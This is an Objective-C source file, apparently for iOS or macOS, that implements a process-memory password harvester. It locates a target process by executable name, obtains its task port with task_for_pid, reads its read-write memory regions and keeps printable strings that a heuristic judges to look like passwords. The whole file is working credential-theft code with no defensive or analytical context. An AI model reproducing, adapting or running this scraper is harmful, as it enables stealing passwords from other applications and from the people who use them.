#import "MemScan.h"
#import <mach/mach.h>
#import <mach/mach_vm.h>
#import <mach/vm_region.h>
#import <unistd.h>
#import <string.h>

extern int proc_listallpids(void *buffer, int buffersize);
extern int proc_pidpath(int pid, void *buffer, uint32_t buffersize);

@interface MemScan ()
+ (BOOL)looksLikePassword:(NSString *)s;
@end

@implementation MemScan

+ (pid_t)pidOfExecutableContaining:(NSString *)needle {
    if (!needle.length) return 0;
    pid_t want = 0;
    pid_t *pids = (pid_t *)malloc(sizeof(pid_t) * 4096);
    if (!pids) return 0;
    int n = proc_listallpids(pids, sizeof(pid_t) * 4096);
    char path[4096];
    for (int i = 0; i < n; i++) {
        pid_t p = pids[i];
        if (p <= 0) continue;
        memset(path, 0, sizeof(path));
        if (proc_pidpath(p, path, sizeof(path)) <= 0) continue;
        NSString *s = [NSString stringWithUTF8String:path];
        if (s && [s rangeOfString:needle options:NSCaseInsensitiveSearch].location != NSNotFound) {
            want = p;
            break;
        }
    }
    free(pids);
    return want;
}

+ (NSDictionary *)regionSummaryForPid:(pid_t)pid {
    if (pid <= 0) return @{ @"error": @"bad pid" };

    mach_port_t task = MACH_PORT_NULL;
    if (task_for_pid(mach_task_self(), pid, &task) != KERN_SUCCESS || task == MACH_PORT_NULL) {
        return @{ @"error": @"task_for_pid failed" };
    }

    NSUInteger regions = 0, rwRegions = 0;
    unsigned long long total = 0, rwTotal = 0;

    mach_vm_address_t addr = 0;
    while (YES) {
        mach_vm_size_t size = 0;
        vm_region_basic_info_data_64_t info;
        mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
        mach_port_t object = MACH_PORT_NULL;

        kern_return_t kr = mach_vm_region(task, &addr, &size, VM_REGION_BASIC_INFO_64,
                                          (vm_region_info_t)&info, &count, &object);
        if (kr != KERN_SUCCESS) break;
        if (object != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), object);
        if (size == 0) break;

        regions++;
        total += size;
        if ((info.protection & VM_PROT_READ) && (info.protection & VM_PROT_WRITE)) {
            rwRegions++;
            rwTotal += size;
        }
        addr += size;
    }

    mach_port_deallocate(mach_task_self(), task);
    return @{ @"regions": @(regions), @"rwRegions": @(rwRegions),
              @"bytes": @(total), @"rwBytes": @(rwTotal) };
}

+ (NSDictionary *)harvestStringsFromPid:(pid_t)pid
                               maxBytes:(NSUInteger)maxBytes
                               maxCands:(NSUInteger)maxCands {
    if (pid <= 0) return @{ @"error": @"bad pid", @"candidates": @[] };

    mach_port_t task = MACH_PORT_NULL;
    kern_return_t tk = task_for_pid(mach_task_self(), pid, &task);
    if (tk != KERN_SUCCESS || task == MACH_PORT_NULL) {
        return @{ @"error": [NSString stringWithFormat:@"task_for_pid kr=%d", tk],
                  @"candidates": @[] };
    }

    NSMutableSet<NSString *> *set = [NSMutableSet set];
    NSUInteger scanned = 0;
    NSUInteger regionCount = 0;
    const size_t CHUNK = 2 * 1024 * 1024;
    uint8_t *buf = (uint8_t *)malloc(CHUNK);

    if (!buf) {
        mach_port_deallocate(mach_task_self(), task);
        return @{ @"error": @"malloc failed", @"candidates": @[] };
    }

    mach_vm_address_t addr = 0;
    while (YES) {
        if (scanned >= maxBytes || set.count >= maxCands) break;

        mach_vm_size_t size = 0;
        vm_region_basic_info_data_64_t info;
        mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
        mach_port_t object = MACH_PORT_NULL;

        kern_return_t kr = mach_vm_region(task, &addr, &size, VM_REGION_BASIC_INFO_64,
                                          (vm_region_info_t)&info, &count, &object);
        if (kr != KERN_SUCCESS) break;
        if (object != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), object);
        if (size == 0) break;

        // 只扫可读写、大小合理的区（堆/数据段）
        BOOL rw = (info.protection & VM_PROT_READ) && (info.protection & VM_PROT_WRITE);
        if (rw && size <= (768ULL * 1024 * 1024)) {
            regionCount++;
            mach_vm_address_t cur = addr;
            mach_vm_address_t end = addr + size;

            while (cur < end && scanned < maxBytes && set.count < maxCands) {
                mach_vm_size_t want = (mach_vm_size_t)CHUNK;
                if ((mach_vm_size_t)(end - cur) < want) want = (mach_vm_size_t)(end - cur);

                mach_vm_size_t got = 0;
                kern_return_t r2 = mach_vm_read_overwrite(task, cur, want,
                                                          (mach_vm_address_t)buf, &got);
                if (r2 == KERN_SUCCESS && got > 0) {
                    scanned += got;

                    NSUInteger runStart = 0;
                    BOOL inRun = NO;
                    for (NSUInteger i = 0; i < got; i++) {
                        uint8_t c = buf[i];
                        BOOL printable = (c >= 0x20 && c <= 0x7e);
                        if (printable) {
                            if (!inRun) { runStart = i; inRun = YES; }
                        } else if (inRun) {
                            NSUInteger len = i - runStart;
                            if (len >= 6 && len <= 32) {
                                NSString *s = [[NSString alloc]
                                    initWithBytes:buf + runStart
                                           length:len
                                         encoding:NSASCIIStringEncoding];
                                if (s && [self looksLikePassword:s]) {
                                    [set addObject:s];
                                }
                            }
                            inRun = NO;
                            if (set.count >= maxCands) break;
                        }
                    }
                    // 缓冲区末尾残留的 run
                    if (inRun && set.count < maxCands) {
                        NSUInteger len = got - runStart;
                        if (len >= 6 && len <= 32) {
                            NSString *s = [[NSString alloc]
                                initWithBytes:buf + runStart
                                       length:len
                                     encoding:NSASCIIStringEncoding];
                            if (s && [self looksLikePassword:s]) [set addObject:s];
                        }
                    }
                }
                cur += want;
            }
        }
        addr += size;
    }

    free(buf);
    mach_port_deallocate(mach_task_self(), task);

    return @{ @"candidates": set.allObjects,
              @"scannedBytes": @(scanned),
              @"regions": @(regionCount) };
}

/// 粗过滤：密码一般是字母数字（可带少量符号），排除路径/JSON/标识符
+ (BOOL)looksLikePassword:(NSString *)s {
    if (s.length < 6 || s.length > 32) return NO;
    if ([s hasPrefix:@"/"] || [s hasPrefix:@"http"] || [s hasSuffix:@".dylib"]) return NO;
    if ([s containsString:@".framework"] || [s containsString:@".app"] ||
        [s containsString:@"{"] || [s containsString:@"}"] || [s containsString:@"."] ||
        [s containsString:@"@"] || [s containsString:@"/"] || [s containsString:@":"]) return NO;

    NSCharacterSet *ok = [NSCharacterSet characterSetWithCharactersInString:
                          @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*_-+="];
    if ([s rangeOfCharacterFromSet:[ok invertedSet]].location != NSNotFound) return NO;

    BOOL hasDigit = [s rangeOfCharacterFromSet:[NSCharacterSet decimalDigitCharacterSet]].location != NSNotFound;
    BOOL hasAlpha = [s rangeOfCharacterFromSet:[NSCharacterSet letterCharacterSet]].location != NSNotFound;
    BOOL hasSpecial = [s rangeOfCharacterFromSet:
                       [NSCharacterSet characterSetWithCharactersInString:@"!@#$%^&*_-+="]].location != NSNotFound;

    if (!hasAlpha) return NO;
    // 长纯字母串多半是标识符/类名
    if (!hasDigit && !hasSpecial && s.length > 10) return NO;

    return YES;
}

@end
